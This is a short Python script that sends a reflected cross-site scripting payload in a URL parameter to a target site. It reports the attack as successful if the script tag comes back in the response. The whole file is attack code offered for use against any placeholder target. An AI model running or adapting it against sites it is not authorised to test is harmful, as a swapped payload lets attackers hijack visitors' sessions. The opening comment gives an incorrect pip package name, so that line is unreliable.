#pip install python-requests
import requests

def perform_xss_attack(target_url, vulnerable_parameter, payload):
    # Craft the URL with the XSS payload
    attack_url = f"{target_url}?{vulnerable_parameter}={payload}"

    try:
        # Send a GET request with the XSS payload
        response = requests.get(attack_url)

        # Check the response for the injected payload (you should customize this based on the actual response)
        if payload in response.text:
            print(f"XSS attack successful! Payload: {payload}")
        else:
            print("XSS attack unsuccessful.")

    except requests.RequestException as e:
        print(f"Error: {e}")

if __name__ == "__main__":
    # Replace 'your_target_url', 'your_vulnerable_parameter', and 'your_payload'
    # with the actual target URL, vulnerable parameter, and XSS payload
    target_url = 'your_target_url'
    vulnerable_parameter = 'your_vulnerable_parameter'
    xss_payload = '<script>alert("XSS Attack");</script>'

    # Perform the XSS attack
    perform_xss_attack(target_url, vulnerable_parameter, xss_payload)
